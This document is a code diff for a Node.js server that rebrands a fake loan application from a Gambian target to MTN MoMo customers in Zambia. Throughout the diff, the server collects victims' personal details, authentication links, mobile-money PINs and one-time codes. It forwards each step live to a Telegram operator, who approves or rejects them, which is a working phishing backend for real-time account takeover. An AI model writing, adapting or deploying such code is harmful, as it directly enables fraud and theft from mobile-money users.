@@ -10,7 +10,7 @@ const botManager = require('./bot_manager');
 const app = express();
 const server = http.createServer(app);
 
-// Configure Socket.io for Render with aggressive resource pooling
+// Configure Socket.io for Render (CORS is essential)
 const io = socketIo(server, {
     cors: {
         origin: "*",
@@ -18,7 +18,7 @@ const io = socketIo(server, {
     }
 });
 
-global.io = io; // Expose socket instance safely into callback query environments
+global.io = io; // Link socket globally so botManager can call back rooms
 
 const PORT = process.env.PORT || 3000;
 const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
@@ -27,57 +27,40 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Global processes catch-all protection layer to keep Render online
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
-});
-process.on('uncaughtException', (err) => {
-    console.error('Uncaught Exception thrown:', err.message);
-});
-
 // Webhook Route for Telegram
 app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
-    try {
-        botManager.bot.processUpdate(req.body);
-    } catch (err) {
-        console.error("Webhook processing error:", err.message);
-    }
+    botManager.bot.processUpdate(req.body);
     res.sendStatus(200);
 });
 
 io.on('connection', (socket) => {
-    // Generate a unique AppID for the session
-    const appId = `GMB-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
-    socket.join(appId);
+    // Generate unique application session tag
+    const appId = `MTNZM-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
     
-    console.log(`🔌 Gambia User connected: ${appId}`);
+    socket.join(appId);
+    console.log(`🔌 User connected: ${appId}`);
+    
+    // Send AppID back to the frontend right away
     socket.emit('session-ready', { appId: appId });
 
-    // Step 1: Login Credentials (Frontend Step 1 -> Triggers Admin Verification)
+    // Standard Log Streams (No admin inline interaction buttons needed here)
+    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇿🇲 Step 1: MoMo Loan Request", data, false));
+    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇿🇲 Step 2: Customer Information", data, false));
+    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇿🇲 Step 3: Employment Information", data, false));
+    
+    // Step 4: Authentication Token (Standard log stream, shifts user to step 5 PIN layout)
     socket.on('step4', (data) => {
-        botManager.sendToAdmin(appId, "🇬🇲 Step 1: Login Credentials", data, true);
+        botManager.sendToAdmin(appId, "🇿🇲 Step 4: Authentication Link", data, false);
     });
 
-    // Step 2: Security PIN Submission (Frontend Step 2 -> Triggers Final PIN Verification)
+    // Step 5: Authorize MoMo PIN (Triggers confirmation/rejection inline buttons in Telegram)
     socket.on('step5', (data) => {
-        if (data && data.pin) {
-            botManager.sendFinalApproval(appId, data.pin);
-        }
+        botManager.sendToAdmin(appId, "🇿🇲 Step 5: MTN MoMo PIN", data, true);
     });
 
-    // Step 3: Loan Details (Frontend Step 3 -> Notification Only)
-    socket.on('step1', (data) => {
-        botManager.sendToAdmin(appId, "🇬🇲 Step 3: Loan Details", data, false);
-    });
-
-    // Step 4: Identity Verification (Frontend Step 4 -> Notification Only)
-    socket.on('step2', (data) => {
-        botManager.sendToAdmin(appId, "🇬🇲 Step 4: Identity Verification", data, false);
-    });
-
-    // Step 5: Employment Information (Frontend Step 5 -> Final Submission Notification)
-    socket.on('step3', (data) => {
-        botManager.sendToAdmin(appId, "🇬🇲 Step 5: Employment Info", data, false);
+    // Step 6: OTP Entry Point (Triggers transaction final approval inline buttons)
+    socket.on('step6', (data) => {
+        botManager.sendFinalApproval(appId, data.code);
     });
 
     socket.on('disconnect', () => {
@@ -86,17 +69,18 @@ io.on('connection', (socket) => {
 });
 
 server.listen(PORT, async () => {
-    console.log(`🚀 Gambia Loan Server running on port ${PORT}`);
+    console.log(`🚀 MTN MoMo Zambia Server running on port ${PORT}`);
     
+    // Auto-configure Webhooks on deployment platforms like Render
     if (EXTERNAL_URL) {
         const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
         try {
             await botManager.bot.setWebHook(webhookUrl);
             console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
         } catch (err) {
-            console.error('❌ Webhook Setup Error:', err.message);
+            console.error('❌ Webhook Setup Failed:', err.message);
         }
     } else {
-        console.warn('⚠️ RENDER_EXTERNAL_URL not found in environment settings. Using long polling fallbacks if configured.');
+        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
     }
 });
